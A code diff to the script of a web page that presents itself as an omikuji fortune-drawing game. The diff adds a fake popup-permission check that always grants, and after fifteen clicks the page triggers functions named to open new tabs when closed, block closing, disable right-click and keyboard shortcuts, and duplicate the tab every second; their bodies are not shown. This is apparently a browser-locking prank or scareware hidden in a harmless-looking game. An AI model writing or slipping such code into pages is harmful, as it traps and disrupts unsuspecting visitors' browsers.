@@ -54,7 +54,10 @@ document.addEventListener('DOMContentLoaded', function() {
     const resultDiv = document.getElementById('result');
     let clickCount = 0;
 
-
+    function requestPopupPermission() {
+        return new Promise((resolve) => {
+            resolve(true);
+        });
     }
 
     function showOmikuji() {
@@ -64,20 +67,22 @@ document.addEventListener('DOMContentLoaded', function() {
     }
 
     function handleClickEvent() {
-        if (requestPopupPermission()) {
-            showOmikuji();
-            clickCount++;
-            if (clickCount >= 15) {
-                showAlert();
-                openNewTabsOnClose();
-                preventClose();
-                disableRightClick();
-                disableShortcuts();
-                duplicateTabEverySecond();
+        requestPopupPermission().then((permissionGranted) => {
+            if (permissionGranted) {
+                showOmikuji();
+                clickCount++;
+                if (clickCount >= 15) {
+                    showAlert();
+                    openNewTabsOnClose();
+                    preventClose();
+                    disableRightClick();
+                    disableShortcuts();
+                    duplicateTabEverySecond();
+                }
+            } else {
+                setTimeout(handleClickEvent, 1000);
             }
-        } else {
-            setTimeout(handleClickEvent, 1000);
-        }
+        });
     }
 
     omikujiButton.addEventListener('click', handleClickEvent);
